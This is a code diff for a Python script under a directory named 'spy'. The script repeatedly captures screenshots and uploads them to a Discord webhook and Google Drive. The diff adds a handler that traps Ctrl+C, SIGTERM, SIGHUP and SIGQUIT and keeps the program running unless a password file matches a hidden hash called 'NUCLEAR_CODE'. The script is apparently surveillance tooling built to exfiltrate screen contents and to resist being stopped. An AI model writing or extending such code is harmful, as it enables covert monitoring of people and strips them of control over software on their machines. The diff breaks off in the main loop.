@@ -2,7 +2,6 @@
 
 import time, os
 from datetime import datetime
-import signal
 from mss import mss
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from dotenv import load_dotenv
@@ -10,6 +9,9 @@ import signal
 import time
 import sys
 
+import signal
+import hashlib
+import sys
 
 # required if you want to upload screenshots on google drive
 from google.oauth2.service_account import Credentials
@@ -19,10 +21,7 @@ from googleapiclient.http import MediaFileUpload
 
 
 load_dotenv('/usr/local/src/spy/.env')
-
-creds = Credentials.from_service_account_file(os.getenv('CREDENTIALS_FILE')) #################### Your Google Service Account Credentials
-service = build('drive', 'v3', credentials=creds)
-folder_id = os.getenv('FOLDER_ID')                                                       #################### Google Drive Folder
+NUCLEAR_CODE = os.getenv('NUCLEAR_CODE')
 
 userhome = os.path.expanduser('~')
 URL = os.getenv('DISCORD_WEBHOOK_URL')
@@ -36,8 +35,10 @@ def upload_file_on_discord(filename):
         
 def upload_file_on_google_drive(file_path, folder_id):
 
+    creds = Credentials.from_service_account_file(os.getenv('CREDENTIALS_FILE')) #################### Your Google Service Account Credentials
+    service = build('drive', 'v3', credentials=creds)
 
-
+    folder_id = os.getenv('FOLDER_ID')                                                       #################### Google Drive Folder
     file_name = os.path.basename(file_path)
 
     file_metadata = {
@@ -80,19 +81,27 @@ def upload_file_on_google_drive(file_path, folder_id):
     }
 
 
-# Define a signal handler function that does nothing
-def signal_handler(signum, frame):
-    print(f"Received signal {signum}, but ignoring it.")
+# Function to handle the received signal
+def handle_signal(signal_number, frame):
+    print("\nSignal received.")
+    try:
+        # Hash the entered password using SHA-256
+        password_hash = hashlib.sha256(open('/tmp/spy.pass', 'r').read().strip().encode()).hexdigest()
+        
+        # Compare the hashed password with the predefined hash
+        if password_hash == NUCLEAR_CODE:
+            print("Password correct. Terminating the program.")
+            sys.exit(0)
+        else:
+            print("Incorrect password. Continuing the program...")
+    except Exception as e:
+        print(e)
 
 if __name__ == "__main__":
-    # The simplest use, save a screen shot of the 1st monitor
-    # Ignore SIGINT (Ctrl+C), SIGTERM, and SIGQUIT
-    #signal.signal(signal.SIGINT, signal_handler)  # Handle SIGINT (Ctrl+C)
-    #signal.signal(signal.SIGTERM, signal_handler) # Handle SIGTERM (termination)
-    #signal.signal(signal.SIGQUIT, signal_handler) # Handle SIGQUIT (quit signal)
-
-    # You can add more signals if needed, for example:
-    #signal.signal(signal.SIGHUP, signal_handler)  # Handle SIGHUP (hangup)
+    
+    # Register the handler for all signals (for demonstration purposes, capturing SIGINT and SIGTERM)
+    for sig in [signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGQUIT]:
+        signal.signal(sig, handle_signal)
 
     while True:
         try:
